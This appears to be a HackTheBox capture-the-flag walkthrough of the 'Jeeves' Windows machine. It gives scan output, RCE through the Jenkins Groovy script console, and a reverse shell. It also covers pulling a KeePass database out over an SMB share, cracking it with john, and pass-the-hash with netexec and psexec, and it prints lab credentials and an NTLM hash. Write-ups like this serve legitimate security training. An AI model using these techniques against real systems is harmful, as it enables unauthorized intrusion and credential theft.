---
icon: windows
---

# Jeeves - Medium

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/jeeves"><strong>Jeeves</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.63 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 16:54 EDT
Nmap scan report for 10.10.10.63
Host is up (0.039s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-15T01:58:04
|_  start_date: 2025-10-15T01:41:38
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   56.00 ms 10.10.16.1
2   60.12 ms 10.10.10.63
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

Visiting the site we are greeted by the Ask Jeeves search engine

Submitting anything triggers a GET to `/error.html`, but the “Search here…” input isn’t sent. The response is just a page with one image.

```html
<img src="jeeves.PNG" width="90%" height="100%">
```

It looks like a ASP.NET error message about failing to connect to MSSQL

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

This confirms the page is hosted by IIS. Directory busting also leads nowhere I'll switch my attention to port 50000

### <mark style="color:$primary;">HTTP Port 50000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

This page returns an error as well. Nmap reveals Jetty

```
http-server-header: Jetty(9.4.z-SNAPSHOT)
```

### <mark style="color:$primary;">Directory Busting</mark>

{% code overflow="wrap" %}
```bash
feroxbuster -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

reveals the endpoint `/askjeeves`This enpoint hosts an instance of Jenkins:

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">RCE via Script Console</mark>

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

```groovy
println "cmd.exe /c whoami".execute().text
```

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell, Ill use [https://www.revshells.com/](https://www.revshells.com/) for this

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

paste the code and make sure you have a listener ready before running it

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

We managed to spawn a shell right in the jenkins directory! Let's grab the initialAdminPassword

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

```
admin:ccd3bc435b3c4f80bea8acca28aec491
```

We should be able to login to Jenkins now as the admin user

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Nothing much else to do here

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

Found a keepass password manager DB let's download it to our machine and try&#x20;

to gain access to it.

I'll start a simple smb server on my end and trasfer it that way

```bash
impacket-smbserver share . -smb2support
```

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking KeePass</mark>

```
keepass2john CEH.kdbx > CEH.kdbx.hash
```

```
john CEH.kdbx.hash -w=/usr/share/wordlists/rockyou.txt
```

```
john CEH.kdbx.hash --show
```

<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

With the password in hand. Now I will use `KeePassXC` to check out what passwords are being stored

<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

I found a Hash in here that seems promising I am going to try it out

{% code overflow="wrap" %}
```bash
netexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

Jackpot! There is no winrm, but there is smb so I will use `impacket-psexec`to get a shell as the administrator

{% code overflow="wrap" %}
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2703).png" alt=""><figcaption></figcaption></figure>

